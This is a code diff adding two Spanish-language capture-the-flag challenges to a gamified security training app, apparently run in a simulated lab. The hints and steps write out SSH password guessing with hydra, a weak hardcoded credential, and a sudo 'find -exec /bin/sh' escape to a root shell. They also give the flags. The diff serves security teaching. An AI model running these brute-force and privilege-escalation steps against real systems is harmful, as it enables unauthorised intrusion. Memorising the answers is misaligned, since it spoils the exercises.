@@ -122,6 +122,48 @@ export const RETOS: Challenge[] = [
     reward: { xp: 300, coins: 230 },
   },
   {
+    id: "r-web01-user",
+    title: "Pie adentro (foothold)",
+    scenario:
+      "web01.nande expone SSH y un usuario de sistema (devops) dejó una contraseña floja de temporada. Entrá y llevate la bandera de usuario.",
+    objective: "Conseguí acceso como devops y leé user.txt.",
+    flag: "ND{foothold_devops}",
+    difficulty: "media",
+    hints: [
+      "Enumerá servicios primero: nmap -sV web01.nande (SSH abierto en el 22).",
+      "La clave de devops es débil (nombre + año). Adiviná o brute con hydra.",
+      "connect web01.nande devops Delfin2024   y luego   cat /home/devops/user.txt",
+    ],
+    steps: [
+      "connect web01.nande devops Delfin2024",
+      "cat /home/devops/user.txt",
+    ],
+    courseId: "c-op-killchain",
+    reward: { xp: 120, coins: 90 },
+  },
+  {
+    id: "r-privesc-sudo",
+    title: "De devops a root (sudo GTFOBins)",
+    scenario:
+      "Ya adentro de web01.nande como devops, escalá a root. Al usuario le dejaron correr un binario como root SIN contraseña (sudo NOPASSWD) para un script viejo — y ese binario escapa a una shell.",
+    objective: "Escalá a root abusando sudo (GTFOBins) y leé /root/flag.txt.",
+    flag: "ND{privesc_sudo_root}",
+    difficulty: "difícil",
+    hints: [
+      "sudo -l te dice qué podés correr como root sin clave.",
+      "find puede ejecutar comandos con -exec. Como root, -exec /bin/sh te da una shell de root.",
+      "sudo find . -exec /bin/sh \\;   y luego   cat /root/flag.txt",
+    ],
+    steps: [
+      "connect web01.nande devops Delfin2024",
+      "sudo -l",
+      "sudo find . -exec /bin/sh \\;",
+      "cat /root/flag.txt",
+    ],
+    courseId: "c-op-killchain",
+    reward: { xp: 220, coins: 170 },
+  },
+  {
     id: "r-sqli-login",
     title: "Sin la llave, igual entro",
     scenario:
@@ -442,7 +484,7 @@ export const TRACKS: LearningTrack[] = [
     hue: 0,
     requires: "t-acceso",
     courseIds: ["c-exploit-msf", "c-ad-directorio", "c-op-killchain"],
-    finalChallenges: ["r-ad-dominio", "r-pivot"],
+    finalChallenges: ["r-ad-dominio", "r-web01-user", "r-privesc-sudo", "r-pivot"],
   },
 ];
 
